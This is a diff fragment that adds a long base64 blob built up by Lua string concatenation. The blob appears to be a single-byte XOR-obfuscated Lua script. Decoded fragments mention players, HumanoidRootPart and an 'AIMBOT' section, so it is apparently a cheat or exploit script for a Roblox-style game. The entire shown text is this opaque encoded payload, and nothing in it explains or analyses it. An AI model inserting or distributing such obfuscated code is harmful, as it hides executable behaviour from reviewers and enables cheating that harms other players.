+    .. "5Pj17fHmtOD7tP3gup6e+Pv39fi04Pv7+MDx+PHk++bg0fr19vjx8LSptPL1+Ofxnvj79/X4"
+    .. "tOD7+/jA8fjx5Pvm4Mbh+vr9+vO0qbTy9fjn8Z74+/f1+LTA29vYy8DR2NHE28bAy93awNHG"
+    .. "wtXYtKm0pLqloZ6e+Pv39fi08uH69+D9+/q08/Hg2vH15vHn4NDm++Tk8fDA+/v4vL2etLS0"
+    .. "tP3ytPr74LTcxsS04Pzx+p60tLS0tLS0tObx4OHm+rT6/fi4tPr9+Li0+fXg/Lr84fPxnrS0"
+    .. "tLTx+vCenrS0tLT4+/f1+LT68fXm8efgwPv7+LSptPr9+J60tLS0+Pv39fi0+vH15vHn4MT1"
+    .. "5uC0qbT6/fietLS0tPj79/X4tPrx9ebx5+DQ/efg9fr38bSptPn14Py6/OHz8Z6etLS0tPL7"
+    .. "5rTLuLTw8ef38frw9frgtP36tP3k9f3m57zj++b/5+T19/Gu0/Hg0PHn9/H68PX64Oe8vb20"
+    .. "8PuetLS0tLS0tLT98rTw8ef38frw9frgrt3n1by2wPv7+La9tPX68LT959Dm++Tk8fDA+/v4"
+    .. "vPDx5/fx+vD1+uC9tOD88fqetLS0tLS0tLS0tLS0+Pv39fi05PXm4LSptPPx4MD7+/jE9ebg"
+    .. "vPDx5/fx+vD1+uC9np60tLS0tLS0tLS0tLT98rTk9ebgtOD88fqetLS0tLS0tLS0tLS0tLS0"
+    .. "tPj79/X4tPD95+D1+vfxtKmetLS0tLS0tLS0tLS0tLS0tLS0tLS83MbEusT75/3g/fv6tLm0"
+    .. "5PXm4LrE++f94P37+r262fXz+v3g4fDxnp60tLS0tLS0tLS0tLS0tLS0/fK08P3n4PX69/G0"
+    .. "qLT68fXm8efg0P3n4PX69/G04Pzx+p60tLS0tLS0tLS0tLS0tLS0tLS0tPrx9ebx5+DQ/efg"
+    .. "9fr38bSptPD95+D1+vfxnrS0tLS0tLS0tLS0tLS0tLS0tLS0+vH15vHn4MD7+/i0qbTw8ef3"
+    .. "8frw9frgnrS0tLS0tLS0tLS0tLS0tLS0tLS0+vH15vHn4MT15uC0qbTk9ebgnrS0tLS0tLS0"
+    .. "tLS0tLS0tLTx+vCetLS0tLS0tLS0tLS08frwnrS0tLS0tLS08frwnrS0tLTx+vCenrS0tLTm"
+    .. "8eDh5vq0+vH15vHn4MD7+/i4tPrx9ebx5+DE9ebguLT68fXm8efg0P3n4PX69/Ge8frwnp74"
+    .. "+/f1+LTy4fr34P37+rTn4PXm4MD7+/jA8fjx5Pvm4Ly9nrS0tLT98rTg+/v4wPH48eT75uDG"
+    .. "4fr6/frztOD88fqetLS0tLS0tLTm8eDh5vqetLS0tPH68J6etLS0tOD7+/jA8fjx5Pvm4Mbh"
+    .. "+vr9+vO0qbTg5uHxnp60tLS04PXn/7rn5PXj+rzy4fr34P37+ry9nrS0tLS0tLS04/z9+PG0"
+    .. "4Pv7+MDx+PHk++bg0fr19vjx8LTw+560tLS0tLS0tLS0tLT98rTcxsS04Pzx+p60tLS0tLS0"
+    .. "tLS0tLS0tLS0+Pv39fi04Pv7+Li05PXm4Li08P3n4PX69/G0qZ60tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tPPx4Nrx9ebx5+DQ5vvk5PHwwPv7+Ly9np60tLS0tLS0tLS0tLS0tLS0/fK04Pv7+LT1"
+    .. "+vC05PXm4LTg/PH6nrS0tLS0tLS0tLS0tLS0tLS0tLS05Obx4v374efE++f94P37+rSptNzG"
+    .. "xLrX0ub1+fGenrS0tLS0tLS0tLS0tLS0tLS0tLS03MbEutfS5vX58bSpnrS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tOT15uC619Lm9fnxtL6019Lm9fnxuvrx47ykuLSnuLSkvZ6etLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLTG9e3y/fH48K7a++D98u287560tLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLTA/eD48bSptLbA29vYtMDR2NHE28bAtrietLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS01/v6"
+    .. "4PH64LSpnrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS2wPH48eT75uDx8LTg+7S2nrS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS6urTg+/v4utr1+fGetLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLq6tLa0dhQ2tLaetLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLq6"
+    .. "tPn14Py68vj7++a88P3n4PX69/G9nrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS6urS2"
+    .. "tOfg4fDntrietLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS00OHm9eD9+/q0qbSmuJ60tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLTd+fXz8bSptLb59eS55P36tp60tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tOm9nrS0tLS0tLS0tLS0tLS0tLTx+vCetLS0tLS0tLS0tLS08frwnp60tLS0tLS0tLS0tLTg"
+    .. "9ef/uuP1/eC8wNvb2MvA0djRxNvGwMvd2sDRxsLV2L2etLS0tLS0tLTx+vCenrS0tLS0tLS0"
+    .. "4Pv7+MDx+PHk++bgxuH6+v3687SptPL1+OfxnrS0tLTx+vC9nvH68J6e0/X58cD19q7X5vH1"
+    .. "4PHA+/Pz+PG87560tLS02vX58bSptLbA+/v4tMDx+PHk++bgtLR2FDa0tNrx9ebx5+C00Ob7"
+    .. "5OTx8La4nrS0tLTX4ebm8frgwvX44fG0qbTy9fjn8bietLS0tNL49fO0qbS2wPv7+MDx+PHk"
+    .. "++bgtrienrS0tLTX9fj49vX3/7SptPLh+vfg/fv6vPH69fb48fC9nrS0tLS0tLS04Pv7+MDx"
+    .. "+PHk++bg0fr19vjx8LSptPH69fb48fCenrS0tLS0tLS0/fK08fr19vjx8LTg/PH6nrS0tLS0"
+    .. "tLS0tLS0tOfg9ebgwPv7+MDx+PHk++bgvL2enrS0tLS0tLS0tLS0tMb17fL98fjwrtr74P3y"
+    .. "7bzvnrS0tLS0tLS0tLS0tLS0tLTA/eD48bSptLbA29vYtMDR2NHE28bAtrietLS0tLS0tLS0"
+    .. "tLS0tLS0tNf7+uDx+uC0qZ60tLS0tLS0tLS0tLS0tLS0tLS0tLbV4eD7+fXg/fe04Pv7+LTg"
+    .. "8fjx5Pvm4LTx+vX2+PHwura4nrS0tLS0tLS0tLS0tLS0tLTQ4eb14P37+rSptKe4nrS0tLS0"
+    .. "tLS0tLS0tLS0tLTd+fXz8bSptLb59eS55P36tp60tLS0tLS0tLS0tLTpvZ60tLS0tLS0tPH4"
+    .. "5/GetLS0tLS0tLS0tLS0xvXt8v3x+PCu2vvg/fLtvO+etLS0tLS0tLS0tLS0tLS0tMD94Pjx"
+    .. "tKm0tsDb29i0wNHY0cTbxsC2uJ60tLS0tLS0tLS0tLS0tLS01/v64PH64LSpnrS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0ttXh4Pv59eD997Tg+/v4tODx+PHk++bgtPD95/X2+PHwura4nrS0tLS0"
+    .. "tLS0tLS0tLS0tLTQ4eb14P37+rSptKe4nrS0tLS0tLS0tLS0tLS0tLTd+fXz8bSptLb59eS5"
+    .. "5P36ufvy8raetLS0tLS0tLS0tLS06b2etLS0tLS0tLTx+vCetLS0tPH68J7pvZ6e4PXn/7rn"
+    .. "5PXj+rzy4fr34P37+ry9nrS0tLTj/P348bTg9ef/uuP1/eC8pLqlob208PuetLS0tLS0tLT9"
+    .. "8rTg+/v40efk0fr19vjx8LTg/PH6nrS0tLS0tLS0tLS0tPL75rTg+/v4uLTw9eD1tP36tOT1"
+    .. "/ebnvOD7+/jR5+Tb9v7x9+DnvbTw+560tLS0tLS0tLS0tLS0tLS0/fK0+vvgtOD7+/i6xPXm"
+    .. "8frgtPvmtPr74LT959Dm++Tk8fDA+/v4vOD7+/i9tOD88fqetLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLTm8fn74vHA+/v40cfEvOD7+/i9nrS0tLS0tLS0tLS0tLS0tLTx+OfxnrS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0+Pv39fi05PXm4LSptPPx4MD7+/jE9ebgvOD7+/i9np60tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tP3ytPr74LTk9ebgtOD88fqetLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS05vH5++Lx"
+    .. "wPv7+NHHxLzg+/v4vZ60tLS0tLS0tLS0tLS0tLS0tLS0tPH45/GetLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0+Pv39fi08P3n4PX69/G0qZ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "3MbEtPX68LS83MbEusT75/3g/fv6tLm05PXm4LrE++f94P37+r262fXz+v3g4fDxnrS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLT75rT59eD8uvzh8/GenrS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tPj79/X4tOL95/32+PG0qbTw/efg9fr38bSoqbTg+/v40efk2fXs0P3n4PX69/Ge"
+    .. "nrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tP3ytPD14PW61v34+Pb79ebwtOD88fqetLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tLS0tPD14PW61v34+Pb79ebwutH69fb48fC0qbTi/ef99vjx"
+    .. "nrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tPH68J6etLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "/fK08PXg9brc/fP8+P3z/OC04Pzx+p60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS08PXg"
+    .. "9brc/fP8+P3z/OC60fr19vjx8LSptOL95/32+PGetLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "8frwnp60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLT98rTw9eD1utj19vH4tOD88fqetLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tLS0tPD14PW62PX28fi6wPHs4LSpnrS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tsDb29i0tHYUNrS0tp60tLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLq6tOD7+/i62vX58Z60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLq6tLbI+raetLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS6urT59eD8uvL4+/vm"
+    .. "vPD95+D1+vfxvZ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLq6tLa05+Dh8Oe2"
+    .. "nrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tPH68J60tLS0tLS0tLS0tLS0tLS0tLS0tPH68J60"
+    .. "tLS0tLS0tLS0tLS0tLS08frwnrS0tLS0tLS0tLS0tPH68J60tLS0tLS0tPH68J60tLS08frw"
+    .. "nvH68L2enuP75v/n5PX38brQ8ef38frw9frg1fDw8fCu1/v6+vH34Lzy4fr34P37+rz9+ufg"
+    .. "9fr38b2etLS0tP3ytP365+D1+vfxrt3n1by2wPv7+La9tOD88fqetLS0tLS0tLTg9ef/uvDx"
+    .. "8vHmvPLh+vfg/fv6vL2etLS0tLS0tLS0tLS0/fK04Pv7+NHn5NH69fb48fC04Pzx+p60tLS0"
+    .. "tLS0tLS0tLS0tLS09+bx9eDxwPv7+NHHxLz9+ufg9fr38b2etLS0tLS0tLS0tLS08frwnrS0"
+    .. "tLS0tLS08frwvZ60tLS08frwnvH68L2enuP75v/n5PX38brQ8ef38frw9frgxvH5++L9+vOu"
+    .. "1/v6+vH34Lzy4fr34P37+rz9+ufg9fr38b2etLS0tP3ytP365+D1+vfxrt3n1by2wPv7+La9"
+    .. "tOD88fqetLS0tLS0tLTm8fn74vHA+/v40cfEvP365+D1+vfxvZ60tLS08frwnvH68L2enuD1"
+    .. "5/+65+T14/q88uH69+D9+/q8vZ60tLS04/z9+PG04PXn/7rj9f3gvKW9tPD7nrS0tLS0tLS0"
+    .. "/fK04Pv7+NHn5NH69fb48fC04Pzx+p60tLS0tLS0tLS0tLS5ubTVtOD7+/i09/X6tPn74vG0"
+    .. "8ub7+bTW9ff/5PX3/7vX/PXm9ffg8ea0/frg+7TD++b/5+T19/G04/3g/Pvh4J60tLS0tLS0"
+    .. "tLS0tLS5ubTy/eb9+vO09bTh5/Hy4fi05+D14PG09/z1+vPxtPL75rT74ea04v3n4fX4tOft"
+    .. "5+Dx+bi05/u0//Hx5LT1nrS0tLS0tLS0tLS0tLm5tPj98/zg4/H98/zgtOft+vf85vv6/e71"
+    .. "4P37+rTk9efnup60tLS0tLS0tLS0tLTy++a0y7i08PHn9/H68PX64LT9+rT95PX95ue84/vm"
+    .. "/+fk9ffxrtPx4NDx5/fx+vD1+uDnvL29tPD7nrS0tLS0tLS0tLS0tLS0tLT98rTw8ef38frw"
+    .. "9frgrt3n1by2wPv7+La9nrS0tLS0tLS0tLS0tLS0tLS0tLS09frwtP3n0Ob75OTx8MD7+/i8"
+    .. "8PHn9/H68PX64L2etLS0tLS0tLS0tLS0tLS0tLS0tLT1+vC0+vvgtOD7+/jR5+Tb9v7x9+Dn"
+    .. "z/Dx5/fx+vD1+uDJtOD88fqenrS0tLS0tLS0tLS0tLS0tLS0tLS09+bx9eDxwPv7+NHHxLzw"
+    .. "8ef38frw9frgvZ60tLS0tLS0tLS0tLS0tLS08frwnrS0tLS0tLS0tLS0tPH68J60tLS0tLS0"
+    .. "tPH68J60tLS08frwnvH68L2enuD15/+65+T14/q88uH69+D9+/q8vZ60tLS04/z9+PG04PXn"
+    .. "/7rj9f3gvKS6paG9tPD7nrS0tLS0tLS0/fK08efk0fr19vjx8LTg/PH6nrS0tLS0tLS0tLS0"
+    .. "tPL75rTk+PXt8ea4tPD14PW0/fq05PX95ue88efk2/b+8ffg57208PuetLS0tLS0tLS0tLS0"
+    .. "tLS0tPj79/X4tPf89eb19+Dx5rSptOT49e3x5rrX/PXm9ffg8eaetLS0tLS0tLS0tLS0tLS0"
+    .. "tPj79/X4tOb7++C0qbT3/PXm9ffg8ea09frwtPf89eb19+Dx5q7S/frw0v3m5+DX/P348Ly2"
+    .. "3OH59fr7/fDG+/vgxPXm4La9nrS0tLS0tLS0tLS0tLS0tLT4+/f1+LT84fn1+vv98LSptPf8"
+    .. "9eb19+Dx5rT1+vC09/z15vX34PHmrtL9+vDS/ebn4Nf8/fjw2/LX+PXn57y23OH59fr7/fC2"
+    .. "vZ6etLS0tLS0tLS0tLS0tLS0tP3ytPr74LTk+PXt8ea6xPXm8frgtPvmtPr74LT3/PXm9ffg"
+    .. "8ea0++a0+vvgtOb7++C0++a0+vvgtPzh+fX6+/3wtOD88fqetLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLTm8fn74vHRx8S85Pj17fHmvZ60tLS0tLS0tLS0tLS0tLS08fjn8f3ytPD14PW62PX28fi0"
+    .. "9frwtPD14PW63P3z/Pj98/zgtOD88fqetLS0tLS0tLS0tLS0tLS0tLS0tLT4+/f1+LTw/efg"
+    .. "9fr38bSptNzGxLT1+vC0vNzGxLrE++f94P37+rS5tOb7++C6xPvn/eD9+/q9utn18/r94OHw"
+    .. "8bT75rT59eD8uvzh8/GetLS0tLS0tLS0tLS0tLS0tLS0tLT4+/f1+LTi/ef99vjxtKm08P3n"
+    .. "4PX69/G0qKm08efk2fXs0P3n4PX69/GetLS0tLS0tLS0tLS0tLS0tLS0tLTw9eD1utb9+Pj2"
+    .. "+/Xm8LrR+vX2+PHwtKm04v3n/fb48Z60tLS0tLS0tLS0tLS0tLS0tLS0tPD14PW63P3z/Pj9"
+    .. "8/zgutH69fb48fC0qbTi/ef99vjxnrS0tLS0tLS0tLS0tLS0tLS0tLS08PXg9brY9fbx+LrA"
+    .. "8ezg1/v4++antKm08/HgwPH1+df7+PvmvOT49e3x5r2enrS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "+Pv39fi0+P368ee0qbTv6Z60tLS0tLS0tLS0tLS0tLS0tLS0tP3ytPHn5Mf8++Pa9fnxtOD8"
+    .. "8fqetLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS04PX2+PG6/frn8ebgvPj9+vHnuLTk+PXt8ea6"
+    .. "0P3n5Pj17dr1+fG0urq0trS01La0urq05Pj17fHmutr1+fG9nrS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS08frwnrS0tLS0tLS0tLS0tLS0tLS0tLS0/fK08efkx/z749zx9fjg/LTg/PH6nrS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tOD19vjxuv365/Hm4Lz4/frx57i0tnYNMbS2tLq6tPn14Py6"
+    .. "8vj7++a8/OH59fr7/fC63PH1+OD8tL+0pLqhvbS6urS2tLu0trS6urT59eD8uvL4+/vmvPzh"
+    .. "+fX6+/3wutn17Nzx9fjg/LS/tKS6ob29nrS0tLS0tLS0tLS0tLS0tLS0tLS08frwnrS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0/fK08efkx/z749D95+D1+vfxtOD88fqetLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS04PX2+PG6/frn8ebgvPj9+vHnuLT59eD8uvL4+/vmvPD95+D1+vfxvbS6urS2"
+    .. "tOfg4fDntr2etLS0tLS0tLS0tLS0tLS0tLS0tLTx+vCetLS0tLS0tLS0tLS0tLS0tLS0tLTw"
+    .. "9eD1utj19vH4usDx7OC0qbTg9fb48br3+/r39eC8+P368ee4tLbI+ra9nrS0tLS0tLS0tLS0"
+    .. "tLS0tLTx+vCetLS0tLS0tLS0tLS08frwnrS0tLS0tLS08frwnrS0tLTx+vCe8frwvZ6exPj1"
+    .. "7fHm57rE+PXt8ebV8PDx8K7X+/r68ffgvPLh+vfg/fv6vOT49e3x5r2etLS0tOT49e3x5rrX"
+    .. "/PXm9ffg8ebV8PDx8K7X+/r68ffgvPLh+vfg/fv6vL2etLS0tLS0tLTg9ef/uuP1/eC8pLqh"
+    .. "vZ60tLS0tLS0tP3ytPHn5NH69fb48fC04Pzx+rT35vH14PHRx8S85Pj17fHmvbTx+vCetLS0"
+    .. "tPH68L2e8frwvZ6exPj17fHm57rE+PXt8ebG8fn74v36867X+/r68ffgvPLh+vfg/fv6vOT4"
+    .. "9e3x5r2etLS0tObx+fvi8dHHxLzk+PXt8ea9nvH68L2enrm5u7upqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqameubm7u7TV3dnW28C0u7TV"
+    .. "0MLV2tfR0LTA1cbT0cDd2tOeubm7u6mpqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqZ6e0/X58cD19q7X5vH14PHH8ffg/fv6vLbA1cbT0cDd"
+    .. "2tO0tLu0tNXQwtXa19HQtNXd2ba9np65ubu7qampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampnrm5u7u01d3Z1tvAtMfA1cDRnrm5u7upqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamenvj7"
+    .. "9/X4tPX9+fb74Nv6+O3E+PXt8ebntKm04Obh8Z74+/f1+LT1/fn2++Db+vjt0frg/eD98ee0"
+    .. "qbTy9fjn8Z6e+Pv39fi09+Hm5vH64NX9+fb74MD15vPx4LSptPr9+J74+/f1+LT1/fn2++DX"
+    .. "+/r68ffg/fv6tKm0+v34np65ubTA9ebz8eC05/H15vf8tP3ntP364PH64P37+vX4+O204Pzm"
+    .. "++Dg+PHwup65ubTX9fnx5vW05/n7++D8/frztOfg/fj4tObh+ue08eLx5u208ub1+fG6nvj7"
+    .. "9/X4tPrx7ODA9ebz8eDH8fXm9/y0qbSknvj79/X4tNXd2dbbwMvA1cbT0cDLxtHSxtHH3LSp"
+    .. "tKS6paSenrm5tNH64P3g7bT39ff88Z74+/f1+LTx+uD94O3X9ff88bSptO/pnvj79/X4tPH6"
+    .. "4P3g7df19/zx3fr94P31+P3u8fC0qbTy9fjn8Z6enrm5u7upqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqameubm7u7TA1cbT0cC0xNXGwJ65"
+    .. "ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampnp74+/f1+LTy4fr34P37+rTz8eDA9ebz8eDE9ebgvPf89eb19+Dx5r2enrS0tLT98rT6"
+    .. "++C09/z15vX34PHmtOD88fqetLS0tLS0tLTm8eDh5vq0+v34nrS0tLTx+vCenrS0tLT4+/f1"
+    .. "+LTk5vHy8ebm8fDE9ebgnp60tLS0/fK09f359vvgxPXm4LSpqbS23PH18La04Pzx+p6etLS0"
+    .. "tLS0tLTk5vHy8ebm8fDE9ebgtKmetLS0tLS0tLS0tLS09/z15vX34PHmrtL9+vDS/ebn4Nf8"
+    .. "/fjwvLbc8fXwtr2enrS0tLTx+Ofx/fK09f359vvgxPXm4LSpqbS2wPvm5/u2tOD88fqenrS0"
+    .. "tLS0tLS05Obx8vHm5vHwxPXm4LSpnrS0tLS0tLS0tLS0tPf89eb19+Dx5q7S/frw0v3m5+DX"
+    .. "/P348Ly2weTk8ebA++bn+7a9nrS0tLS0tLS0tLS0tPvmtPf89eb19+Dx5q7S/frw0v3m5+DX"
+    .. "/P348Ly2wPvm5/u2vZ6etLS0tPH45/H98rT1/fn2++DE9ebgtKmptLbG+/vgtrTg/PH6np60"
+    .. "tLS0tLS0tOTm8fLx5ubx8MT15uC0qZ60tLS0tLS0tLS0tLT3/PXm9ffg8eau0v368NL95ufg"
+    .. "1/z9+PC8nrS0tLS0tLS0tLS0tLS0tLS23OH59fr7/fDG+/vgxPXm4LaetLS0tLS0tLS0tLS0"
+    .. "vZ60tLS08frwnp60tLS0/fK05Obx8vHm5vHwxPXm4J60tLS0tLS0tPX68LTk5vHy8ebm8fDE"
+    .. "9ebgrt3n1by21vXn8cT15uC2vbTg/PH6np60tLS0tLS0tObx4OHm+rTk5vHy8ebm8fDE9ebg"
+    .. "nrS0tLTx+vCenrS0tLS5ubTB+v3i8ebn9fi08vX4+Pb19/+6nrS0tLTm8eDh5vq09/z15vX3"
+    .. "4PHmrtL9+vDS/ebn4Nf8/fjwvLbc8fXwtr2etLS0tLS0tLT75rT3/PXm9ffg8eau0v368NL9"
+    .. "5ufg1/z9+PC8tsHk5PHmwPvm5/u2vZ60tLS0tLS0tPvmtPf89eb19+Dx5q7S/frw0v3m5+DX"
+    .. "/P348Ly2wPvm5/u2vZ60tLS0tLS0tPvmtPf89eb19+Dx5q7S/frw0v3m5+DX/P348Ly23OH5"
+    .. "9fr7/fDG+/vgxPXm4La9nvH68J6enrm5u7upqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqameubm7u7TC3cfd1t3Y3cDNtNfc0dffnrm5u7up"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqame"
+    .. "nvj79/X4tPLh+vfg/fv6tP3nwv3n/fb48byetLS0tPf1+fHm9bietLS0tOD15vPx4MT15uC4"
+    .. "nrS0tLT3/PXm9ffg8eaevZ6etLS0tP3ytPr74LT1/fn2++DC/ef99vjx1/zx9/+04Pzx+p60"
+    .. "tLS0tLS0tObx4OHm+rTg5uHxnrS0tLTx+vCenrS0tLT98rT6++C09/X58eb1nrS0tLS0tLS0"
+    .. "++a0+vvgtOD15vPx4MT15uCetLS0tLS0tLT75rT6++C09/z15vX34PHmtOD88fqenrS0tLS0"
+    .. "tLS05vHg4eb6tPL1+OfxnrS0tLTx+vCenrS0tLT4+/f1+LT75v3z/fq0qZ60tLS0tLS0tPf1"
+    .. "+fHm9brX0ub1+fG6xPvn/eD9+/qenrS0tLT4+/f1+LTw/ebx9+D9+/q0qZ60tLS0tLS0tOD1"
+    .. "5vPx4MT15uC6xPvn/eD9+/q0ubT75v3z/fqenrS0tLT4+/f1+LTk9eb1+ee0qZ60tLS0tLS0"
+    .. "tMb17ff15+DE9eb1+ee6+vHjvL2enrS0tLTk9eb1+ee60v344PHmwO3k8bSpnrS0tLS0tLS0"
+    .. "0frh+brG9e339efg0v344PHmwO3k8brR7Pf44fDxnp60tLS05PXm9fnnutL9+ODx5tDx5/fx"
+    .. "+vD1+uDn3frn4PX69/HntKm07560tLS0tLS0tNf89eb19+Dx5rietLS0tLS0tLT39fnx5vWe"
+    .. "tLS0tOmenrS0tLT4+/f1+LTm8efh+OC0qZ60tLS0tLS0tOP75v/n5PX38a7G9e339efgvJ60"
+    .. "tLS0tLS0tLS0tLT75v3z/fq4nrS0tLS0tLS0tLS0tPD95vH34P37+rietLS0tLS0tLS0tLS0"
+    .. "5PXm9fnnnrS0tLS0tLS0vZ6etLS0tP3ytPr74LTm8efh+OC04Pzx+p60tLS0tLS0tObx4OHm"
+    .. "+rTg5uHxnrS0tLTx+vCenrS0tLTm8eDh5vq05vHn4fjgut365+D1+vfxrt3n0PHn9/H68PX6"
+    .. "4NvyvJ60tLS0tLS0tPf89eb19+Dx5p60tLS0vZ7x+vCenp65ubu7qampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampnrm5u7u00drA3cDNtNfV"
+    .. "19zRnrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqamenvj79/X4tPLh+vfg/fv6tObx8/3n4PHm0frg/eDtvPn78PH4vZ6etLS0tP3y"
+    .. "tPr74LT5+/Dx+J60tLS0tLS0tPvmtPr74LT5+/Dx+K7d59W8ttn78PH4tr2etLS0tLS0tLT7"
+    .. "5rT6++C0+fvw8fi6xPXm8frgtOD88fqenrS0tLS0tLS05vHg4eb6nrS0tLTx+vCenrS0tLS5"
+    .. "ubTa8eLx5rTm8fP95+Dx5rTE+PXt8ea09/z15vX34PHm57qetLS0tP3ytMT49e3x5ueu0/Hg"
+    .. "xPj17fHm0ub7+df89eb19+Dx5rz5+/Dx+L204Pzx+p6etLS0tLS0tLTx+uD94O3X9ff88c/5"
+    .. "+/Dx+Mm0qbT6/fienrS0tLS0tLS05vHg4eb6nrS0tLTx+vCenrS0tLT4+/f1+LT84fn1+vv9"
+    .. "8LSpnrS0tLS0tLS0+fvw8fiu0v368NL95ufg1/z9+PDb8tf49efnvJ60tLS0tLS0tLS0tLS2"
+    .. "3OH59fr7/fC2nrS0tLS0tLS0vZ6etLS0tPj79/X4tOb7++C0qZ60tLS0tLS0tPn78PH4rtL9"
+    .. "+vDS/ebn4Nf8/fjwvJ60tLS0tLS0tLS0tLS23OH59fr7/fDG+/vgxPXm4LaetLS0tLS0tLS9"
+    .. "np60tLS0/fK0/OH59fr7/fCetLS0tLS0tLT1+vC05vv74J60tLS0tLS0tPX68LTm+/vgrt3n"
+    .. "1by21vXn8cT15uC2vZ60tLS0tLS0tPX68LT84fn1+vv98Lrc8fX44Py0qrSktOD88fqenrS0"
+    .. "tLS0tLS08frg/eDt1/X3/PHP+fvw8fjJtKm04Obh8Z6etLS0tPH45/GenrS0tLS0tLS08frg"
+    .. "/eDt1/X3/PHP+fvw8fjJtKm0+v34np60tLS08frwnvH68J6envj79/X4tPLh+vfg/fv6tOH6"
+    .. "5vHz/efg8ebR+uD94O28+fvw8fi9np60tLS08frg/eDt1/X3/PHP+fvw8fjJtKm0+v34np7x"
+    .. "+vCenp65ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampnrm5u7u03drdwN3V2LTR2sDdwM20x9fV2p65ubu7qampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampnp74+/f1+LTy4fr34P37"
+    .. "+rT9+v3g/fX4/e7x0frg/eDt1/X3/PG8vZ6etLS0tP3ytPH64P3g7df19/zx3fr94P31+P3u"
+    .. "8fC04Pzx+p60tLS0tLS0tObx4OHm+p60tLS08frwnp60tLS08frg/eDt1/X3/PHd+v3g/fX4"
+    .. "/e7x8LSptODm4fGenrS0tLS5ubTA/P3ntPLh+Pi05/f1+rT89eTk8frntNva2M2029rX0bie"
+    .. "tLS0tLm5tOP88fq08frg/eDttPn78PG0/ee08v3m5+C09ffg/eL14PHwup6etLS0tPL75rTL"
+    .. "uLTw8ef38frw9frgtP36tP3k9f3m57yetLS0tLS0tLTj++b/5+T19/Gu0/Hg0PHn9/H68PX6"
+    .. "4Oe8vZ60tLS0vbTw+56etLS0tLS0tLT98rTw8ef38frw9frgrt3n1by22fvw8fi2vbTg/PH6"
+    .. "np60tLS0tLS0tLS0tLTm8fP95+Dx5tH64P3g7byetLS0tLS0tLS0tLS0tLS0tPDx5/fx+vD1"
+    .. "+uCetLS0tLS0tLS0tLS0vZ6etLS0tLS0tLTx+vCetLS0tPH68J7x+vCenp65ubu7qampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampnrm5u7u0"
+    .. "0NHA0dfAtNrRw7S7tMbR2dvC0dC00drA3cDd0ceeubm7u6mpqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqZ6e4/vm/+fk9ffxutDx5/fx+vD1"
+    .. "+uDV8PDx8K7X+/r68ffgvJ60tLS08uH69+D9+/q8/frn4PX69/G9np60tLS0tLS0tP3ytP36"
+    .. "5+D1+vfxrt3n1by22fvw8fi2vbTg/PH6np60tLS0tLS0tLS0tLTg9ef/uvDx8vHmvPLh+vfg"
